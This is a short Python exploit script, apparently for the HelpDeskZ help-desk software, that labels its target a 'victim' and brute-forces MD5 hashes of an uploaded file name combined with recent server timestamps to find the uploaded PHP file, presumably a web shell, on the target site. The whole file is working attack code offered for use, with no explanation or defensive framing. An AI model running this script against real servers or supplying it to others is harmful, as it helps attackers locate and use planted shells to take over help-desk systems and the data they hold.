import argparse
import hashlib
import requests
import sys
import datetime
import time
from log_colors import *
requests.packages.urllib3.disable_warnings()

class HelpDeskZUnauthShell:
    
    def __init__(self, url, fname):
        print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
        self.url = url
        self.fname = fname
        self.session = requests.Session()

    # exploitation
    def exploit(self):
        print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
        r = self.session.get(self.url)
        hd = datetime.datetime.strptime(r.headers['date'], '%a, %d %b %Y %H:%M:%S %Z')
        ct = int((hd - datetime.datetime(1970,1,1)).total_seconds())
        
        for i in range(0, 1024):
            h = hashlib.md5(self.fname + str(ct - i)).hexdigest()
            url = self.url.rstrip() + "/" + h + ".php"
            print (LogColors.YELLOW + "request: " + url + "..." + LogColors.ENDC)
            r = self.session.head(url)
            if r.ok:
                print (LogColors.GREEN + "successful found." + url + LogColors.ENDC)
                print (LogColors.GREEN + "exit :)" + LogColors.ENDC)
                sys.exit()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-f','--file', required = True, help = "filename")
    args = vars(parser.parse_args())
    url, fname = args['url'], args['file']
    cve = HelpDeskZUnauthShell(url, fname)
    cve.exploit()

